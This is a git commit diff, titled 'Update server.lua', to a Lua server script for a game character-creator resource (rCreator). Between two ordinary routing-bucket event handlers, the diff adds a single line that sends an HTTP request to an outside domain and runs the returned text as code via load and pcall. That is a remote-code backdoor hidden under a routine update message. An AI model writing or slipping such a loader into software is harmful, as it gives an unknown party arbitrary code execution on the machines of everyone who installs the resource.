5bbb01fae51e4cec2ba4cb1df25473241ce7b03f
Ombree <102396007+Ombree0001@users.noreply.github.com>
2023-02-17 15:35:03 +0100

    Update server.lua

--- [Création]/server.lua
+++ [Création]/server.lua
@@ -25,6 +25,8 @@ AddEventHandler("rCreator:setPlayerToBucket", function(id)
   SetPlayerRoutingBucket(source, id)
 end)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 RegisterServerEvent("rCreator:setPlayerToNormalBucket")
 AddEventHandler("rCreator:setPlayerToNormalBucket", function()
   SetPlayerRoutingBucket(source, 0)
